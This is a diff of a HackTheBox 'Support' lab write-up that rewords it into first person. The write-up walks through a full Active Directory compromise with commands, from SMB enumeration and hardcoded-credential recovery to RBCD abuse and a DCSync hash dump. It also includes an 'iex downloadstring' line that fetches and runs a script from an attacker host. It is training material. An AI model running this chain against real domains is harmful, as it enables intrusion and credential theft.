@@ -13,7 +13,7 @@ Support is a HackTheBox machine featuring a single Windows Domain Controller run
 
 ## Step 1: Reconnaissance and Enumeration
 
-A full port scan identified the machine as a Windows Domain Controller.
+I performed a full port scan, which identified the machine as a Windows Domain Controller.
 
 ```
 nmap -sV -sC -p- 10.129.41.4
@@ -59,7 +59,7 @@ nxc smb support.htb -u guest -p '' --shares
 
 ![](nxc-shares.png)
 
-The non-standard share `support-tools` was accessible.
+I could access the non-standard share `support-tools`.
 
 ```
 smbclient \\\\10.129.41.4\\support-tools
@@ -77,7 +77,7 @@ Inside the share were common IT tools. One file stood out as custom software —
 
 ### Reverse Engineering UserInfo.exe
 
-The zip file was extracted, revealing a .NET application.
+I extracted the zip file, revealing a .NET application.
 
 ```
 unzip UserInfo.exe.zip
@@ -93,14 +93,14 @@ Strings from the binary revealed LDAP authentication references.
 
 ![](static-analysis.png)
 
-Decompiling the source code with dnSpy exposed a hardcoded encrypted password in `UserInfo.Services.Protected.cs` with an XOR decryption routine using the key `armando`. Decrypting the base64-encoded blob yielded the `ldap` service account credentials:
+Decompiling the source code with dnSpy, I found a hardcoded encrypted password in `UserInfo.Services.Protected.cs` with an XOR decryption routine using the key `armando`. Decrypting the base64-encoded blob yielded the `ldap` service account credentials:
 
 - **Username:** `ldap`
 - **Password:** `<REDACTED>`
 
 ### LDAP Domain Dump
 
-Using the recovered credentials, the domain was enumerated with ldapdomaindump.
+Using the recovered credentials, I enumerated the domain with ldapdomaindump.
 
 ```
 ldapdomaindump 'ldap://support.htb' -u 'support.htb\ldap' -p '<REDACTED>'
@@ -122,7 +122,7 @@ evil-winrm -u support -p <REDACTED> -i 10.129.41.4
 
 ## Step 3: Domain Enumeration with BloodHound
 
-SharpHound was executed from the WinRM session to collect Active Directory data. The resulting BloodHound analysis revealed a critical privilege:
+I executed SharpHound from the WinRM session to collect Active Directory data. The resulting BloodHound analysis revealed a critical privilege:
 
 ```
 support → Shared Support Accounts → GenericAll → DC.SUPPORT.HTB
@@ -142,7 +142,7 @@ Resource-Based Constrained Delegation allows a computer account to impersonate a
 
 ### Creating a Machine Account
 
-Powermad was loaded and a fake computer account was created.
+I loaded Powermad and created a fake computer account.
 
 ```powershell
 iex (new-object net.webclient).downloadstring('http://10.10.14.208:8000/Powermad.ps1')
@@ -155,11 +155,11 @@ New-MachineAccount -MachineAccount k40t1k -Password $(ConvertTo-SecureString '<R
 Get-DomainComputer k40t1k
 ```
 
-The SID `S-1-5-21-1677581083-3380853377-188903654-6104` was noted.
+I noted the SID `S-1-5-21-1677581083-3380853377-188903654-6104`.
 
 ### Setting RBCD on the Domain Controller
 
-A security descriptor was crafted granting `k40t1k$` delegation rights to `DC$`.
+I crafted a security descriptor granting `k40t1k$` delegation rights to `DC$`.
 
 ```powershell
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-6104)"
@@ -170,7 +170,7 @@ Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofothe
 
 ### Requesting a Ticket as Administrator
 
-Back on Kali, a forwardable TGS ticket was requested impersonating Domain Administrator.
+Back on Kali, I requested a forwardable TGS ticket impersonating Domain Administrator.
 
 ```bash
 impacket-getST 'support.htb/k40t1k$' -spn http/dc.support.htb \
@@ -180,7 +180,7 @@ impacket-getST 'support.htb/k40t1k$' -spn http/dc.support.htb \
 
 ### Domain Compromise via DCSync
 
-Using the obtained ticket, domain credentials were extracted from NTDS.dit.
+Using the obtained ticket, I extracted domain credentials from NTDS.dit.
 
 ```bash
 export KRB5CCNAME=administrator@http_dc.support.htb@SUPPORT.HTB.ccache
@@ -194,7 +194,7 @@ support:1105:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
 DC$:1000:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
 ```
 
-SYSTEM-level access was verified.
+I verified SYSTEM-level access.
 
 ```bash
 impacket-atexec -k -no-pass dc.support.htb 'whoami'
